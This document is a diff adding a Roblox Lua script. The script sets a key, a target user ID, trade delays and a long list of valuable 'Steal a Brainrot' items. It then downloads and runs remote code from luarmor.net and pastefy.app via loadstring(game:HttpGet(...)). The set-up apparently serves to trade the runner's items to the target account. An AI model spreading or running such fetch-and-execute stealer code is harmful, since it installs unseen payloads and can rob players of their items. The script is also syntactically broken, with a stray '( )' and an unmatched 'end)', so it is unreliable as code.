@@ -1,0 +1,70 @@
+getgenv().SECRET_KEY = "mrr_9df6055f8e704cdd851c84ef245cb301"
+getgenv().TARGET_ID = 8988491666
+getgenv().DELAY_STEP = 1      
+getgenv().TRADE_CYCLE_DELAY = 2
+getgenv().TARGET_BRAINROTS = {
+    ["Strawberry Elephant"] = true,
+    ["Meowl"] = true,
+    ["Griffin"] = true,
+    ["Skibidi Toilet"] = true,
+    ["Headless Horseman"] = true,
+    ["Hydra Dragon Cannelloni"] = true,
+    ["Dragon Gingerini"] = true,
+    ["Dragon Cannelloni"] = true,
+    ["Love Love Bear"] = true,
+    ["La Supreme Combinasion"] = true,
+    ["Celestial Pegasus"] = true,
+    ["Cerberus"] = true,
+    ["Popcuru and Fizzuru"] = true,
+    ["Rosey and Teddy"] = true,
+    ["Capitano Moby"] = true,
+    ["Cooki and Milki"] = true,
+    ["Burguro And Fryuro"] = true,
+    ["Ketupat Bros"] = true,
+    ["Reinito Sleighito"] = true,
+    ["Fortunu and Cashuru"] = true,
+    ["Los Amigos"] = true,
+    ["La Secret Combinasion"] = true,
+    ["Los Sekolahs"] = true,
+    ["Signore Carapace"] = true,
+    ["La Casa Boo"] = true,
+    ["Fragrama and Chocrama"] = true,
+    ["La Food Combinasion"] = true,
+    ["Elefanto Frigo"] = true,
+    ["Spooky and Pumpky"] = true,
+    ["Ginger Gerat"] = true,
+    ["La Ginger Sekolah"] = true,
+    ["Sammyni Fattini"] = true,
+    ["Los Spaghettis"] = true,
+    ["Festive 67"] = true,
+    ["Ventoliero Pavonero"] = true,
+    ["Cloverat Clapat"] = true,
+    ["Spaghetti Tualetti"] = true,
+    ["Antonio"] = true,
+    ["Garama and Madundung"] = true,
+    ["Nacho Spyder"] = true,
+    ["Rosetti Tualetti"] = true,
+    ["Gold Gold Gold"] = true,
+    ["Fishino Clownino"] = true,
+    ["Jolly Jolly Sahur"] = true,
+    ["Lavadorito Spinito"] = true,
+    ["Ketchuru and Musturu"] = true,
+    ["Swaggy Bros"] = true,
+    ["Tirilikalika Tirilikalako"] = true,
+    ["Orcaledon"] = true,
+    ["La Romantic Grande"] = true,
+    ["La Taco Combinasion"] = true,
+    ["Tictac Sahur"] = true,
+    ["Ketupat Kepat"] = true,
+    ["Tang Tang Keletang"] = true,
+    ["Lovin Rose"] = true,
+    ["Los Tacoritas"] = true,
+    ["Eviledon"] = true,
+    ["Los Primos"] = true
+}
+loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/fbcd1d25889a843297107dea3642044d.lua"))
+( )
+end)
+task.spawn(function()
+loadstring(game:HttpGet("https://pastefy.app/VtcItmlH/raw"))( )
+end)
